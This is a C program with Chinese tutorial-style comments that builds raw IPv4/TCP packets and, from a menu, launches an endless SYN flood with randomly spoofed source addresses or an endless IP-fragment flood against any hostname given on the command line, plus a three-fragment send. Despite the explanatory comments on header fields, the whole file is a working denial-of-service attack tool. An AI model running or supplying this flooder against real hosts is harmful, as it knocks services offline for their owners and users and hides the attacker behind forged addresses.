/*
 *	组包
 *	需要root权限执行
 */

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <errno.h>

#define ErrPrintQ(_msg) do{fprintf(stderr, "[Error] %s: %s\n", _msg, strerror(errno)); exit(EXIT_FAILURE);}while(0)

#define DEST_PORT 80
#define LOCAL_PORT 8124

void dos_attack(int sockfd, struct sockaddr_in *paddr, int tack_type)
{
	char buffer[100];  /**** 用来放置我们的数据包  ****/
	struct ip *ip;
	struct tcphdr *tcp;
	int head_len;
	int n = 0;

	/******* 我们的数据包实际上没有任何内容,所以长度就是两个结构的长度  ***/
	head_len = sizeof(struct ip) + sizeof(struct tcphdr);

	bzero(buffer,100);

	/********  填充IP数据包的头部,还记得IP的头格式吗?     ******/
	ip = (struct ip *)buffer;
	ip->ip_v = IPVERSION;             /** 版本一般的是 4      **/
	ip->ip_hl = sizeof(struct ip) >> 2; /** IP数据包的头部长度  IPv4包头的最小长度是20个字节，因此IHL这个字段的最小值用十进制表示就是5 (5x4 = 20字节)。就是说，它表示的是包头的总字节数是4字节的倍数。**/
	ip->ip_tos = 0;                   /** 服务类型：定义IP协议包的处理方法，它包含如下子字段
        过程字段：3位，设置了数据包的重要性，取值越大数据越重要，取值范围为：0（正常）~ 7（网络控制）
        延迟字段：1位，取值：0（正常）、1（期特低的延迟）
        流量字段：1位，取值：0（正常）、1（期特高的流量）
        可靠性字段：1位，取值：0（正常）、1（期特高的可靠性）
        成本字段：1位，取值：0（正常）、1（期特最小成本）
        未使用：1位	**/
	ip->ip_len = htons(head_len);     /** IP数据包的总长度      **/
	ip->ip_id = 0;                    /** 让认证： 系统去填写吧      **/
	ip->ip_off = 0;                   /** 段偏移量：当数据分组时，它和更多段位（MF, More fragments）进行连接，帮助目的主机将分段的包组合。和上面一样,省点时间 **/



	ip->ip_ttl = MAXTTL;              /** TTL：表示数据包在网络上生存多久，每通过一个路由器该值减一，为0时将被路由器丢弃。最长的时间   255    **/
	ip->ip_p = IPPROTO_TCP;           /** 协议：8位，这个字段定义了IP数据报的数据部分使用的协议类型。常用的协议及其十进制数值包括ICMP(1)、TCP(6)、UDP(17)。 TCP包  **/
	ip->ip_sum = 0;                   /** 校验和：16位，是IPv4数据报包头的校验和。   **/
	ip->ip_dst = paddr->sin_addr;      /** 我们攻击的对象      **/

	/*******  开始填写TCP数据包                           *****/
	tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
	tcp->source = htons(LOCAL_PORT);
	tcp->dest = paddr->sin_port;           /** 目的端口    **/
	tcp->seq = random();
	tcp->ack_seq = 0;
	/** TCP头长度，指明了在TCP头部包含多少个32位的字。此信息是必须的，因为options域的长度是可变的，所以整个TCP头部的长度也是变化的。从技术上讲，这个域实际上指明了数据部分在段内部的其起始地址(以32位字作为单位进行计量)，因为这个数值正好是按字为单位的TCP头部的长度，所以，二者的效果是等同的**/
	tcp->doff = 5;
	tcp->syn = 1;                        /** 我要建立连接 **/
	tcp->check = 0;


	switch(tack_type) {
		case '1':
			goto TCP_DOs;
			break;
		case '2':
			goto IP_DOs;
			break;
		case '3':
			goto SEND_IPs;
			break;
		default:
			printf("无效的选择\n");
			return;
	}

TCP_DOs:
	printf("开始TCP层DOs 攻击\n");
	while(1)
	{
		//	产生随机IP
		ip->ip_src.s_addr=random();

		//	什么都让系统做了,也没有多大的意思,还是让我们自己来校验头部吧
		//            下面这条可有可无
		//tcp->check=check_sum((unsigned short *)tcp, sizeof(struct tcphdr));
		if (sendto(sockfd, buffer, head_len, 0, (struct sockaddr *)paddr, sizeof(struct sockaddr)) == -1)
			ErrPrintQ("sendto");
		n ++;
		if (n % 1000 == 0)
			printf("->times: %d\n", n);
	}
	return;

IP_DOs:
	printf("开始IP层DOs攻击（注意：只有IPv4有ip分组 才有ip DOs攻击） \n");
	while(1)
	{
		//	产生随机源IP
		ip->ip_src.s_addr=random();

		ip->ip_src.s_addr = htons(1234);
		ip->ip_id = htons(random());		//	随便起一个片ID
		ip->ip_off = htons(0x2000);			//	只发一个片 offset = 0； 有效负载大小 sizeof(struct tcphdr) + 4 =  24 （8的倍数）
		ip->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + 4);
		if (sendto(sockfd, buffer, sizeof(struct ip) + sizeof(struct tcphdr) + 4, 0, (struct sockaddr *)paddr, sizeof(struct sockaddr)) == -1)
			ErrPrintQ("sendto");

		n ++;
		if (n % 1000 == 0)
			printf("->times: %d\n", n);
	}
	return;

SEND_IPs:
	//将一个IP分组分成3个IP片   只有IPv4有ip分组
	printf("发送3有效个IP片  （注意：只有IPv4有ip分组）\n");
	ip->ip_src.s_addr = htons(1234);
	ip->ip_id = htons(0x00001111);		//	随便起一个片ID
	ip->ip_off = htons(0x2000);			//	第一个片 offset = 0； 有效负载大小 sizeof(struct tcphdr) + 4 =  24 （8的倍数）
	ip->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + 4);
	if (sendto(sockfd, buffer, sizeof(struct ip) + sizeof(struct tcphdr) + 4, 0, (struct sockaddr *)paddr, sizeof(struct sockaddr)) == -1)
		ErrPrintQ("sendto 1");

	ip->ip_off = htons(0x2003);			//	第二个片 offset = 24/8； 有效负载大小 8 byte
	ip->ip_len = htons(sizeof(struct ip) + 8);
	if (sendto(sockfd, buffer, sizeof(struct ip) + 8, 0, (struct sockaddr *)paddr, sizeof(struct sockaddr)) == -1)
		ErrPrintQ("sendto 2");


	ip->ip_off = htons(0x0004);			//	最后一个片 offset=（24+8）/8； 有效负载大小 8 byte
	ip->ip_len = htons(sizeof(struct ip) + 8);
	if (sendto(sockfd, buffer, sizeof(struct ip) + 8, 0, (struct sockaddr *)paddr, sizeof(struct sockaddr)) == -1)
		ErrPrintQ("sendto 3");
	return;
}

int main(int argc, char *argv[])
{
	struct sockaddr_in addr;
	struct hostent *host;
	int sockfd;
	int on = 1;
	int key;

	memset(&addr, '\0', sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = ntohs(DEST_PORT);

	if (argc != 2) {
		fprintf(stderr, "usage: %s [hostname/ip]\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	if (inet_aton(argv[1], &addr.sin_addr) == 0) {
		if ((host = gethostbyname(argv[1])) == NULL)
			ErrPrintQ("gethostbyname");
		addr.sin_addr = *(struct in_addr *)host->h_addr_list[0];
	}
	printf("Dest IP: %s, Port: %d\n", inet_ntoa(addr.sin_addr), DEST_PORT);

	if (setuid(getuid()) == -1)
		ErrPrintQ("setuid");

	if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
		ErrPrintQ("socket");

	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) == -1)
		ErrPrintQ("setsockopt");

	printf("选择一个你想做的事(IPv4)：\n");
	printf("1.发动对目标IP 的TCP层DOs 攻击\n");
	printf("2.发动对目标IP 的IP层DOs 攻击\n");
	printf("3.向目标IP 发送3个有效的IP分组\n");
	key = getchar();
	dos_attack(sockfd, &addr, key);

	close(sockfd);

	return 0;
}



